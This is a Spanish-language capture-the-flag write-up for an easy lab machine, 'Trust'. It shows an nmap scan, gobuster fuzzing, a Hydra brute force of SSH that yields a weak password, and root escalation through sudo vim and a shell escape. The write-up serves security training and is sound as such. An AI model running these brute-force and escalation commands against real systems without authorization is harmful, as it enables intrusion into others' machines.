# 🛡️ Write-Up: Trust.zip

- **Dificultad:** Muy fácil  
- **Objetivo:** Obtener acceso inicial y escalar privilegios  

---

## 🔍 Enumeración

Se descomprime el archivo `Trust.zip` y se ejecuta la máquina virtual.

Se realiza un escaneo completo de puertos con Nmap:

```bash
nmap -p- -sC -sV --open -sS -n -Pn <IP>
```

Parámetros utilizados:

-p-: escaneo de todos los puertos
-sC: scripts por defecto
-sV: detección de versiones
--open: muestra solo puertos abiertos
-sS: SYN scan (sigiloso)
-n: evita resolución DNS
-Pn: omite ping previo
📌 Resultados
Puerto 22: SSH
Puerto 80: HTTP

Se identifican las versiones de los servicios, lo cual es clave para posibles vectores de ataque.

🌐 Análisis Web

Al detectar el puerto HTTP abierto, se realiza fuzzing con Gobuster para encontrar directorios y archivos ocultos:

gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
📌 Resultados

Se encuentran:

index.html
secret.php

Se accede a index.html, pero no presenta información relevante para la explotación.

Luego se analiza secret.php, donde se identifica un posible nombre de usuario.

🔐 Acceso Inicial

Se realiza un ataque de fuerza bruta contra el servicio SSH utilizando Hydra.

hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://<IP>

Se comienza con un diccionario pequeño. Al no obtener resultados, se utiliza uno más grande.

📌 Resultado
Usuario: mario
Contraseña: chocolate

Se obtiene acceso al sistema vía SSH:

ssh mario@<IP>
🚀 Escalada de Privilegios

Una vez dentro, se verifican los permisos del usuario:

sudo -l
📌 Resultado

El usuario puede ejecutar:

(ALL) /usr/bin/vim

Esto significa que puede ejecutar VIM como root.

⚠️ Explotación (GTFOBins)

Se aprovecha esta mala configuración utilizando técnicas documentadas en GTFOBins.

Se ejecuta:

sudo vim

Dentro de VIM, se lanza una shell:

:!/bin/bash
👑 Verificación

Se comprueba que se obtuvo acceso como root:

whoami

Resultado:

root
✅ Conclusión

Se logró:

Acceso inicial mediante fuerza bruta en SSH
Escalada de privilegios mediante mala configuración de sudo

✔️ Se obtuvo acceso root exitosamente, completando el laboratorio.

📚 Lecciones aprendidas
La enumeración es clave para identificar vectores de ataque
El uso de diccionarios adecuados mejora ataques de fuerza bruta
Configuraciones incorrectas de sudo pueden comprometer todo el sistema
Herramientas como GTFOBins son fundamentales en escaladas de privilegios
